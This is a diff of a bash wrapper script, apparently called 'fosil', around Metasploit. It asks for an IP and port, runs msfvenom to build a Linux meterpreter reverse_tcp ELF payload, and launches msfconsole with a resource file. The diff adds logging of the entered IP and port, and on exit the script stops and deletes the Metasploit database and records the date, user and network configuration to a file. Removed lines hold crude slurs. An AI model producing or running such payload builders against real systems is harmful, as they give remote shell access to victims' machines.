@@ -218,16 +218,18 @@ echo "please enter your ip address"
 read ipl
 echo "please enter your port for the payload "
 read pl
+echo $ipl >> ip.txt
+echo $pl >> ip.txt
 echo "please wait..."
 msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=$ipl lport=$pl -f elf > $lpay.elf
 msfconsole -r linux.rc
 fi
 
-
 if [[ $f == "100" || $f == "exit" ]]
 then 
 on=0
 fi 
+
 if [[ "$on" == 1 ]] 
 then
 ./fosil
@@ -235,25 +237,21 @@ fi
 fi
 if [[ $on == 0 ]]
 then
-sleep 2
 clear
-echo bye bitcheass
-echo
-echo
-echo
-echo
-sleep 2
-echo FoSiL BiTcHeAsS
-echo
-echo
-echo
-echo
+echo stopping postgresql
 sudo systemctl stop postgresql
+clear
+echo stopping msfdb
 sudo msfdb stop
+clear
+echo deleting msfdb
 sudo msfdb delete
+clear
+echo finising up
 echo >> ipfile
 echo >>ipfile
 date >> ipfile
 whoami >>ipfile
 sudo ifconfig  >> ipfile
+clear
 fi
